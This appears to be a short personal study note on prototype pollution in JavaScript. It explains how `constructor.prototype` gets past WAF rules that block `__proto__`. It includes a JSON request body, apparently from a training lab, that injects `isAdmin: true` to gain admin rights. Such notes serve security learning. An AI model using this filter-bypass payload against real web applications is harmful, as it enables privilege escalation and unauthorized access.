---
tags:
  - security
  - web
  - javascript
---
A way to get around WAF rules that block `__proto__`.
- `object.constructor.prototype` is equivalent to `object.__proto__`
```js
var myObject = {};
myObject.constructor // function Object(){...}
myObject.constructor.prototype // Object.Prototype
```

```

{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"SnCnToqczvbfNc04wR6VXJcluR1fGkzp",
	"constructor" : {
		"prototype" :{
			"isAdmin" :true
		}
	}
}
```